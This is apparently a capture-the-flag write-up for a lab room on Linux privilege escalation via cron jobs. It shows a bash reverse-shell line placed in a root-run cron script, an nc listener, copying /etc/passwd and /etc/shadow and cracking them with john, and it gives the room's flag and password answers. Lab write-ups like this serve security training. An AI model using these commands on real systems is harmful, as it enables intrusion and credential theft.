## Privilege Escalation Cron Jobs Solution

### Notes: 
- Check `etc/crontabs` for script files that are run as root but the current user can access. Can change the script for reverse shell.
- Check `etc/crontabs` for script files that have been deleted already but not removed from crontabs. Can create the same file.
  - Check path. If home/{user} included then can create in currrent users home folder. Also check if user has write permission on other path address
- tar, 7z, rsync etc. can be exploited using their wildcard feature

### How many user-defined cron jobs can you see on the target system?
1. Run `cat /etc/crontab`

![Screenshot 2024-02-08 at 10 20 56 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/9cfb6faa-673c-4ad6-ae70-353c42eb8701)


**Answer: 4**

### What is the content of the flag5.txt file?
1. We can see in the crontabs there is a file /home/karen/backup.sh. Run the `cat /home/karen/backup.sh` to check its contents.
2. We also discover that we have access to the file.

![Screenshot 2024-02-08 at 10 31 06 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/7357ebe4-23d2-48d1-b498-6ff72f231262)

4. Modify this file to cp flag5.txt to launch a reverse shell
5. Let's launch a listener at port 9999 in our kali machine. 
`nc -lvnp 1234`

6. Let's locate our serve IP by running `ifconfig` in our kali machine get the `inet` of `tun0`

7. Run `vim /home/karen/backup.sh` and modify the code to following to create a reverse shell. 
   ```
   #!/bin/bash
   
   bash -i  >& /dev/tcp/{tun0 inet ip}/1234 0>&1
   ```
9. Run `chmod +x backup.sh`
10. Wait on the listener terminal until reverse shell is activated.

![Screenshot 2024-02-09 at 12 41 26 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/56f31900-49b8-43bc-9694-d8e526fee1d9)

11. Run `cat /home/ubuntu/flag5.txt`

![Screenshot 2024-02-09 at 12 42 27 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/bfa16ef6-38d4-4803-998e-7bd30e76dd8d)

**Answer: THM-383000283**

### What is Matt's password? 
1. Create a local file `passwd.txt` and `shadow.txt` and copy the content from the target machine's `/etc/passwd` and `/etc/shadow`.
   
![Screenshot 2024-02-09 at 12 24 16 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/b8377ccf-22ed-46e2-bae6-ba36ac44a106)

![Screenshot 2024-02-09 at 12 25 52 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/0e962f32-f3ca-4638-baf3-250ed0414ce3)

3. Unshadow the files:
   
   ```unshadow passwd.txt shadow.txt > passwords.txt```
   
4. Run john the ripper on `passwords.txt`
```
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

![Screenshot 2024-02-09 at 12 28 56 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/5f93b4cd-176f-41e6-855a-3006b6c44385)


**Answer: 123456**

